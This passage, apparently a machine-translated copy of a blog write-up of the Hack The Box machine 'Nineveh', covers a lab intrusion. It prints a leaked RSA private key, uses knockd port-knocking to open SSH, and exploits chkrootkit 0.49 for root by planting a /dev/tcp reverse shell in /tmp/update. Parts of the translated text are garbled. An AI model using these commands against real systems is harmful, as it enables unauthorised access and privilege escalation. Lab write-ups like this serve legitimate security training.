    P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
    fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
    tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
    iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
    MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
    PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
    i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
    il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
    fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
    -----END RSA PRIVATE KEY-----
    

公钥给出一个用户名，阿姆罗伊斯：

    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
    

### 检查端口敲击

另一个有趣的事情是从shell中跳出来作为w-data是过程：`knockd`

    www-data@nineveh:/$ ps auxww
    ...[snip]...
    root      1334  1.1  0.2   8756  2228 ?        Ss   Apr10  15:29 /usr/sbin/knockd -d -i ens33
    ...[snip]...
    

`knockd`是端口敲门的守护进程，当某些端口按顺序命中时，它将设置某些防火墙规则。我可以在以下位置找到配置文件：`/etc/knockd.conf`

    www-data@nineveh:/$ cat /etc/knockd.conf 
    [options]
     logfile = /var/log/knockd.log
     interface = ens33
    
    [openSSH]
     sequence = 571, 290, 911 
     seq_timeout = 5
     start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
     tcpflags = syn
    
    [closeSSH]
     sequence = 911,290,571
     seq_timeout = 5
     start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
     tcpflags = syn
    

这表示我可以通过点击571，290，然后使用syns点击911来打开SSH，所有这些都在5秒内完成，并且这样做时，它将添加一个规则以允许我的IP进入端口22。

### 敲

[This wiki page](https://wiki.archlinux.org/index.php/Port_knocking) gives a good example of using to port knock. I’ll write it as a one liner:`nmap`

    root@kali# for i in 571 290 911; do
    > nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null
    > done; ssh -i ~/keys/id_rsa_nineveh_amrois amrois@10.10.10.43
    Ubuntu 16.04.2 LTS
    Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    133 packages can be updated.
    66 updates are security updates.
                                                                                                                                                                                                            
                                                                                                                                                                                                            
    You have mail.                                                                                                                                                                                          
    Last login: Wed Apr 22 05:34:21 2020 from 10.10.14.24                                                                                                                                                    
    amrois@nineveh:~$
    

It loops over the three ports, and for each scans Nineveh with using a short timeout and no retries, directing the output to . Then it connects with SSH.`nmap``/dev/null`

I can also grab :`user.txt`

    amrois@nineveh:~$ cat user.txt 
    82a864f9************************
    

### Shortcut - SSH from localhost

On first solving, I didn’t look for , but rather, I just made a copy of the private key in on Nineveh.`knockd``/dev/shm`

    www-data@nineveh:/dev/shm$ chmod 600 .id_rsa
    www-data@nineveh:/dev/shm$ ssh -i .id_rsa amrois@10.10.10.43
    Could not create directory '/var/www/.ssh'. 
    The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
    ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
    Are you sure you want to continue connecting (yes/no)? yes
    Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
    Ubuntu 16.04.2 LTS
    Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    133 packages can be updated.
    66 updates are security updates.
    
    
    You have mail.
    Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
    amrois@nineveh:~$
    

## Priv： 阿姆罗伊斯 –>根

### 列举

在没有找到太多[关于linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)之后，我注意到系统根目录中有一个不寻常的文件夹。它包含现在注明日期的文本文件：`/report`

    amrois@nineveh:/report$ ls -la
    total 32
    drwxr-xr-x  2 amrois amrois 4096 Apr 11 14:12 .
    drwxr-xr-x 24 root   root   4096 Jul  2  2017 ..
    -rw-r--r--  1 amrois amrois 4799 Apr 11 14:10 report-20-04-11:14:10.txt
    -rw-r--r--  1 amrois amrois 4799 Apr 11 14:11 report-20-04-11:14:11.txt
    -rw-r--r--  1 root   root   4384 Apr 11 14:12 report-20-04-11:14:12.txt
    amrois@nineveh:/report$ date
    Sat Apr 11 14:12:09 CDT 2020
    

这些报告正在寻找对常见可执行文件和奇数文件的更改：

    amrois@nineveh:/report$ cat report-20-04-11:14:12.txt                                 
    ROOTDIR is `/'                                                                        
    Checking `amd'... not found                                                           
    Checking `basename'... not infected                                                   
    Checking `biff'... not found                                                          
    Checking `chfn'... not infected                                                       
    Checking `chsh'... not infected                                                       
    Checking `cron'... not infected                                                       
    Checking `crontab'... not infected
    ...[snip]...
    Checking `aliens'... 
    /dev/shm/pspy64
    Searching for sniffer's logs, it may take a while... nothing found
    Searching for HiDrootkit's default dir... nothing found
    Searching for t0rn's default files and dirs... nothing found
    Searching for t0rn's v8 defaults... nothing found
    Searching for Lion Worm default files and dirs... nothing found
    Searching for RSHA's default files and dir... nothing found
    Searching for RH-Sharpe's default files... nothing found
    Searching for Ambient's rootkit (ark) default files and dirs... nothing found
    Searching for suspicious files and dirs, it may take a while... 
    /lib/modules/4.4.0-62-generic/vdso/.build-id
    /lib/modules/4.4.0-62-generic/vdso/.build-id
    Searching for LPD Worm files and dirs... nothing found
    Searching for Ramen Worm files and dirs... nothing found
    Searching for Maniac files and dirs... nothing found
    ...[snip]...
    Searching for suspect PHP files... 
    /var/tmp/0xdf.php
    
    Searching for anomalies in shell history files... Warning: `//root/.bash_history' file size is zero
    Checking `asp'... not infected
    ...[snip]...
    

有趣的是，它确实识别了我的网络外壳。

我上传并运行[pspy](https://github.com/DominicBreuker/pspy)，每分钟都有一系列活动，许多过程都引用了。[chkrootkit](http://www.chkrootkit.org/)是一个工具，它将检查主机是否有根工具包的迹象。`/usr/bin/chkrootkit`

### 查克根漏洞利用

幸运的是，我有一个针对以下漏洞的漏洞：`chkrootkit`

    root@kali# searchsploit chkrootkit
    ---------------------------------------------------- ----------------------------------------
     Exploit Title                                      |  Path
                                                        | (/usr/share/exploitdb/)
    ---------------------------------------------------- ----------------------------------------
    Chkrootkit - Local Privilege Escalation (Metasploit | exploits/linux/local/38775.rb
    Chkrootkit 0.49 - Local Privilege Escalation        | exploits/linux/local/33899.txt
    ---------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    

该文件说，由于以下循环，由于拼写错误，中的任何文件都将运行：`txt``$SLAPPER_FILES`

       for i in ${SLAPPER_FILES}; do
          if [ -f ${i} ]; then
             file_port=$file_port $i
             STATUS=1
          fi
    

预期的行为是设置为等于 。但是因为缺少了，所以会将其视为设置然后运行。`$file_port``"$file_port $i"``""``bash``file_port=$file_port``$i`

`$SLAPPER_FILES`是提前几行设置的：

       SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
       SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
       ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
    

### 壳

我将编写一个简单的反向 shell 并使其可执行：`/tmp/update`

    amrois@nineveh:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1'
    #!/bin/bash
    
    bash -i >& /dev/tcp/10.10.14.24/443 0>&1
    amrois@nineveh:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1' > update
    amrois@nineveh:/tmp$ chmod +x update
    

下次运行时，我得到一个外壳：`chkroot`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.43.
    Ncat: Connection from 10.10.10.43:44006.
    bash: cannot set terminal process group (11510): Inappropriate ioctl for device
    bash: no job control in this shell
    root@nineveh:~#
    

我可以抓住旗帜：

    root@nineveh:~# cat root.txt
    8a2b4956************************
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html)